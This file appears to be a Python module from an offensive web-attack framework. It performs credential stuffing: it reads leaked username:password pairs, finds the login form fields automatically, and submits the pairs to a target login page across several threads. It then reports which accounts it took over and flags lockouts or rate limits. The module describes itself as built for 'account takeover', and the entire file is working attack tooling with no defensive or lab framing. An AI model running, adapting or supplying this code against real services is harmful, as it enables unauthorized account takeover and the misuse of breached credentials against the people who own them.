"""Credential stuffing module — tests leaked username:password pairs against login forms."""

from __future__ import annotations
import time
import re
import threading
from concurrent.futures import ThreadPoolExecutor, as_completed
from webforg.core.module import BaseAuxiliaryModule, Option
from webforg.core.target import Target
from rich.console import Console
from rich.table import Table
from rich.panel import Panel
from rich.progress import Progress, SpinnerColumn, BarColumn, TextColumn, MofNCompleteColumn
from rich import box

console = Console()


class Scanner(BaseAuxiliaryModule):
    """Credential stuffing — tests leaked username:password combos against a login form."""

    name = "Credential Stuffer"
    description = "Tests leaked credential pairs (user:pass) against login forms for account takeover"
    author = "K0uR1i"
    rank = "good"

    def _build_options(self) -> None:
        super()._build_options()
        self.add_option("TARGETURI", Option(str, required=False, default="/login", description="Login form URL"))
        self.add_option("CREDS_FILE", Option(str, required=True, description="Path to credentials file (user:pass per line)"))
        self.add_option("USER_FIELD", Option(str, required=False, default=None, description="Username form field name (auto-detect if empty)"))
        self.add_option("PASS_FIELD", Option(str, required=False, default=None, description="Password form field name (auto-detect if empty)"))
        self.add_option("METHOD", Option(str, required=False, default="POST", description="HTTP method (POST or GET)"))
        self.add_option("FAIL_STRING", Option(str, required=False, default=None, description="String indicating failed login"))
        self.add_option("SUCCESS_STRING", Option(str, required=False, default=None, description="String indicating successful login"))
        self.add_option("THREADS", Option(int, required=False, default=5, description="Parallel threads"))
        self.add_option("DELAY", Option(float, required=False, default=0.3, description="Delay between attempts"))
        self.add_option("MAX_ATTEMPTS", Option(int, required=False, default=500, description="Max attempts"))

    def _build_url(self) -> str:
        """Build login URL without double slashes."""
        base = self.target.base_url.rstrip("/")
        target_uri = (self.get_option("TARGETURI") or "/login").lstrip("/")
        return f"{base}/{target_uri}"

    def run(self) -> dict:
        url = self._build_url()
        session = self.target.session
        threads = self.get_option("THREADS") or 5
        delay = self.get_option("DELAY") or 0.3
        max_attempts = self.get_option("MAX_ATTEMPTS") or 500

        console.print()
        console.print(f"  [bold red]>[/] Credential Stuffer — [bold]{url}[/]")

        # ── Load credentials ──
        creds_file = self.get_option("CREDS_FILE")
        creds = self._load_creds(creds_file)
        if not creds:
            return {"success": False, "error": "No credentials loaded from file"}
        creds = creds[:max_attempts]
        console.print(f"  [dim green]>[/] Loaded [bold]{len(creds)}[/] credential pairs")
        console.print()

        # ── Auto-detect form fields ──
        user_field = self.get_option("USER_FIELD")
        pass_field = self.get_option("PASS_FIELD")
        if not user_field or not pass_field:
            user_field, pass_field = self._detect_fields(session, url)
            console.print(f"  [dim green]>[/] Detected fields: user=[bold]{user_field}[/]  pass=[bold]{pass_field}[/]")
        console.print()

        # ── Stuff credentials ──
        results = []
        found_creds = []
        lockout_detected = False
        attempts = 0
        attempts_lock = threading.Lock()
        fail_string = self.get_option("FAIL_STRING")
        success_string = self.get_option("SUCCESS_STRING")

        start_time = time.time()

        def try_cred(cred_pair):
            nonlocal lockout_detected, attempts
            user, pwd = cred_pair

            with attempts_lock:
                attempts += 1

            try:
                if (self.get_option("METHOD") or "POST").upper() == "POST":
                    data = {user_field: user, pass_field: pwd}
                    resp = session.post(url, data=data, timeout=10)
                else:
                    params = {user_field: user, pass_field: pwd}
                    resp = session.get(url, params=params, timeout=10)

                body = resp.text.lower()
                status = resp.status_code

                # Lockout detection
                if status == 429 or "locked" in body or "too many" in body or "rate limit" in body or "captcha" in body:
                    lockout_detected = True
                    return {"username": user, "password": pwd, "status": "LOCKED", "details": "Rate limited or locked"}

                # Success check
                if success_string:
                    if success_string.lower() in body:
                        return {"username": user, "password": pwd, "status": "FOUND", "details": f"HTTP {status}"}
                else:
                    if fail_string:
                        if fail_string.lower() not in body and status in (200, 302):
                            return {"username": user, "password": pwd, "status": "FOUND", "details": f"HTTP {status}"}
                    else:
                        if status in (301, 302, 303) and "login" not in resp.url.lower():
                            return {"username": user, "password": pwd, "status": "FOUND", "details": f"Redirect: {resp.url}"}

                return {"username": user, "password": pwd, "status": "FAIL", "details": f"HTTP {status}"}

            except Exception as e:
                return {"username": user, "password": pwd, "status": "ERROR", "details": str(e)[:40]}

        with Progress(
            SpinnerColumn(),
            TextColumn("[bold green]{task.description}[/]"),
            BarColumn(bar_width=30),
            MofNCompleteColumn(),
            TextColumn("•"),
            TextColumn("[bold]{task.fields[speed]}[/]"),
        ) as progress:
            task = progress.add_task("Stuffing credentials", total=len(creds), speed="0/s")

            with ThreadPoolExecutor(max_workers=threads) as executor:
                futures = {}
                for cred in creds:
                    future = executor.submit(try_cred, cred)
                    futures[future] = cred
                    if threads == 1 and delay > 0:
                        time.sleep(delay)

                for future in as_completed(futures):
                    try:
                        result = future.result()
                    except Exception:
                        continue
                    if result:
                        results.append(result)
                        if result["status"] == "FOUND":
                            found_creds.append(result)
                        speed = f"{attempts / max(time.time() - start_time, 0.01):.1f}/s"
                        progress.update(task, advance=1, speed=speed)
                        if result["status"] == "LOCKED":
                            console.print(f"\n  [bold yellow]>[/] Lockout detected after {attempts} attempts!")
                            break

        elapsed = time.time() - start_time

        # ── Results ──
        if found_creds:
            console.print()
            console.print(f"  [bold green]═══════════════════════════════════════════[/]")
            console.print(f"  [bold green]  [OK] {len(found_creds)} VALID CREDENTIAL(S) FOUND[/]")
            console.print(f"  [bold green]═══════════════════════════════════════════[/]")
            for r in found_creds:
                console.print(f"  [bold green][OK][/] [bold]{r['username']}[/]:[bold yellow]{r['password']}[/]  [dim]{r['details']}[/]")
            console.print()

        table = Table(title="Credential Stuffing Summary", box=box.ROUNDED, border_style="bold red")
        table.add_column("Metric", style="bold cyan")
        table.add_column("Value")
        table.add_row("Credential Pairs", str(len(creds)))
        table.add_row("Attempts Made", str(attempts))
        table.add_row("Valid Found", f"[bold green]{len(found_creds)}[/]")
        table.add_row("Lockout Detected", f"[bold yellow]Yes[/]" if lockout_detected else "[dim]No[/]")
        table.add_row("Time Elapsed", f"{elapsed:.1f}s")
        console.print(table)

        return {
            "success": True,
            "found": found_creds,
            "attempts": attempts,
            "total_creds": len(creds),
            "lockout_detected": lockout_detected,
            "elapsed": elapsed,
        }

    def _load_creds(self, filepath: str) -> list[tuple[str, str]]:
        """Load credentials from file (user:pass per line)."""
        creds = []
        try:
            with open(filepath, "r") as f:
                for line in f:
                    line = line.strip()
                    if not line or line.startswith("#"):
                        continue
                    if ":" in line:
                        parts = line.split(":", 1)
                        creds.append((parts[0].strip(), parts[1].strip()))
        except FileNotFoundError:
            console.print(f"  [bold red]>[/] File not found: {filepath}")
        except Exception as e:
            console.print(f"  [bold red]>[/] Error reading file: {e}")
        return creds

    def _detect_fields(self, session, url: str) -> tuple[str, str]:
        """Auto-detect username and password form fields."""
        user_field = "username"
        pass_field = "password"
        try:
            resp = session.get(url, timeout=10)
            inputs = re.findall(r'<input[^>]*>', resp.text, re.IGNORECASE)
            for inp in inputs:
                name_match = re.search(r'name=["\']([^"\']+)["\']', inp)
                type_match = re.search(r'type=["\']([^"\']+)["\']', inp)
                if name_match:
                    name = name_match.group(1).lower()
                    input_type = type_match.group(1).lower() if type_match else "text"
                    if input_type == "password":
                        pass_field = name_match.group(1)
                    elif any(kw in name for kw in ("user", "login", "email", "account")):
                        user_field = name_match.group(1)
                    elif input_type == "text" and user_field == "username":
                        user_field = name_match.group(1)
        except Exception:
            pass
        return user_field, pass_field
